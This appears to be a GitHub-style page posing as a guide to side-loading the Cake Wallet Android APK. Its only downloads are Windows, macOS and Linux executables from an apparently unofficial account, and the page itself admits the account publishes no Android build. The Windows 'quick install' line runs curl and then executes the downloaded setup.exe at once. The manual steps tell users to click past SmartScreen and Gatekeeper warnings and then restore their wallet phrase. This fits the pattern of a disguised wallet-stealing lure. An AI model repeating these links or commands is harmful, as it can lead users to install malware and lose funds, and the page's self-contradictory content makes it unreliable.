![Cake Wallet android apk guide](assets/cake-wallet-android-apk-article-banner.png)

# Install the Cake Wallet Android APK

Which APK to take, how to side-load it, and what changes on GrapheneOS.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Most people should install Cake Wallet from Google Play. If you need the APK, take the universal file from the upstream Cake Wallet release; the desktop release in this account publishes no Android build. Then open the app, set a PIN and restore your wallet from its phrase.

<!-- ARTICLE-BODY-BEGIN -->

## Which APK matches your phone
The upstream release ships several APKs because Android devices differ in CPU architecture. The universal file works everywhere and is the safe default; arm64-v8a suits current phones, armeabi-v7a covers older 32-bit devices, and x86_64 is for emulators rather than real handsets.

Taking the wrong one is not dangerous, just useless: Android refuses the install with an architecture error instead of running a broken app. Note that the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> in this account is a desktop release with no APK among its assets, so the Android files come from the upstream project release rather than from the desktop download.

## Side-loading the APK
Enable installation from your browser or file manager when Android asks, open the downloaded APK and confirm. Play Protect may warn about an app installed outside the store; the warning is expected for side-loading and is not a virus report.

After the install, the app behaves exactly like the store version: it asks for a PIN and then offers to create or restore. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-setup-pin.md">Set up Cake Wallet for the first time</a> covers the PIN length choice and why the PIN is not a backup, which is the step new users most often get wrong.

## If you already have a wallet
Choose Restore Wallet rather than Create. The phrase, keys or QR code from your old install is enough, and the old device keeps working until you stop using it. Restoring does not move funds; it copies the keys.

The one thing to check before wiping an old phone is that the restored balance is correct and the phrase is the one you thought it was. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md">Restore your Cake Wallet wallet</a> lists the restore paths and the reason a valid phrase can still be rejected, usually a mismatched seed type.

## Using an old phone as a signer
An old Android phone does not have to be thrown away or used as a hot wallet. With the Cupcake app it becomes an offline signer that pairs with Cake Wallet by QR code, and the keys never touch the network.

That setup is not the same as running Cake Wallet on the old phone. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-cupcake-pairing.md">Cupcake pairing with Cake Wallet</a> explains the two-way QR step and which coins can be signed offline, so you can decide before you rely on it for real funds.

## On an iPhone instead
iOS has no side-loading path in the normal case, so the App Store listing is the install route and there is no APK equivalent to match. The wallet itself, the PIN and the restore flow are the same.

<a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-ios-install.md">Install Cake Wallet on iOS</a> covers the App Store steps and what to do when a phone has both an old install and a new one. Moving between Android and iOS is a restore, not a transfer.

## FAQ
### Is Cake Wallet on the Play Store?
Yes, the app is published on Google Play. The APK route exists for people who cannot or will not use the store.
### Does Cake Wallet work on GrapheneOS?
It runs on GrapheneOS. Install it from the store if you use one, or side-load the APK and allow the install when the system asks.
### Which APK should I take if I am unsure?
The universal APK. It covers every supported CPU architecture, so it cannot fail for the wrong reason.
### Does the APK update itself?
No. Side-loaded apps update when you install a newer APK; the store version updates through Google Play.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[set up Cake Wallet for the first time](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-setup-pin.md) · [restore your Cake Wallet wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) · [Cupcake pairing with Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-cupcake-pairing.md) · [install Cake Wallet on iOS](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-ios-install.md)
